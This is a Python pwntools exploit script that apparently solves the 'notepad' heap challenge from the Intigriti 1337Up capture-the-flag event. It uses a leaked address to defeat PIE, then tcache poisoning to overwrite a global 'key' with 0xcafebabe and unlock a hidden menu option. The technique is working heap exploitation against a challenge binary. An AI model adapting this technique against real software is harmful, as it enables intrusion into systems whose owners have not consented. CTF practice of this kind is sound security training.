#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './notepad_patched'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "50"]
host, port = 'notepad.ctf.intigriti.io', 1341

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
breakrva 0x105b	#secretNote + 32
c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
#└─$ pwn checksec notepad_patched 
#[*] '/home/kali/Windows/Intigriti1337Up/notepad/challenge/notepad_patched'
#    Arch:       amd64-64-little
#    RELRO:      Full RELRO
#    Stack:      Canary found
#    NX:         NX enabled
#    PIE:        PIE enabled
#    RUNPATH:    b'.'
#    Stripped:   No



def malloc(idx, size, val):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', str(idx).encode())
    io.sendlineafter(b'> ', str(size).encode())
    io.sendafter(b'> ', val)


def view(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(idx).encode())

def edit(idx, val):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'> ', str(idx).encode())
    io.sendafter(b'> ', val)

def free(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'> ', str(idx).encode())



def exploit():
    global io
    io = initialize()
    io.recvuntil("Here a gift: ")
    main = int(io.recvline().strip().decode(), 16)
    elf.address = main - elf.sym["main"]
    log.info("main address : %#x", main)
    log.info("elf address : %#x", elf.address)
    log.info("key address : %#x", elf.sym["key"])
    malloc(0, 0x40, b"A")
    malloc(1, 0x40, b"A")
    free(0)
    free(1)
    edit(1, p64(elf.sym["key"]))
    malloc(2, 0x40, b"A")
    malloc(3, 0x40, p64(0xcafebabe))
    io.sendlineafter(b'> ', b'5')
    io.interactive()
    
if __name__ == '__main__':
    exploit()

